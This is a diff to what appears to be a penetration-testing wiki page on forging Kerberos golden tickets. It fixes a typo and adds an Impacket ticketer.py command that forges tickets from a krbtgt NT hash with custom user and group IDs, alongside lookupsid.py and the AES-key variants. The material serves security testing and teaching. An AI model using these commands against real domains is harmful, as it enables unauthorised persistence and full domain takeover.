@@ -24,7 +24,7 @@ For Golden and Silver tickets, it's important to remember that, by default, [tic
 
 In these situations, testers can either look for the domain groups that have local administrator privileges on the target machine, or specify all the groups ids when creating the ticket.
 
-_**Nota bene**: Deny ACEs could actually prevent the second solution from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the tickey, including the domain admin group id._
+_**Nota bene**: Deny ACEs could actually prevent the second solution from working. Encountering a Deny ACE preventing domain admins to log on could be an issue when having all groups ids in the ticket, including the domain admin group id._
 {% endhint %}
 
 {% hint style="info" %}
@@ -47,11 +47,14 @@ There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for eac
 # Find the domain SID
 lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
 
-# Create the golden ticket (with an NT hash)
+# Create the golden ticket (with an RC4 key, i.e. NT hash)
 ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN randomuser
 
 # Create the golden ticket (with an AES 128/256bits key)
 ticketer.py -aesKey $krbtgtAESkey -domain-sid $domainSID -domain $DOMAIN randomuser
+
+# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
+ticketer.py -nthash $krbtgtNThash -domain-sid $domainSID -domain $DOMAIN -user-id $USERID -groups $GROUPID1,$GROUPID2,... randomuser
 ```
 {% endtab %}
 
